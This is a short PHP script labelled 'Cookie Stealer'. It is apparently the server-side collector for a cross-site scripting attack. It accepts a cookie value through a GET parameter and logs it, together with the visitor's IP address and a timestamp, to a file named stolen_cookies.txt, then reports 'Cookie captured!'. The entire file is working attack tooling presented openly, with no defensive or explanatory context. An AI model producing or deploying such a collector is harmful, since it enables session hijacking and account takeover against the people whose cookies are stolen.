<?php
// Cookie Stealer - Logs stolen cookies
if (isset($_GET['cookie']) || isset($_GET['c'])) {
    $cookie = isset($_GET['cookie']) ? $_GET['cookie'] : $_GET['c'];
    $log_file = 'stolen_cookies.txt';
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date('Y-m-d H:i:s');
    
    $entry = "[$time] IP: $ip | Cookie: $cookie\n";
    file_put_contents($log_file, $entry, FILE_APPEND);
    
    echo "✅ Cookie captured!";
} else {
    echo "❌ No cookie received";
}
?>
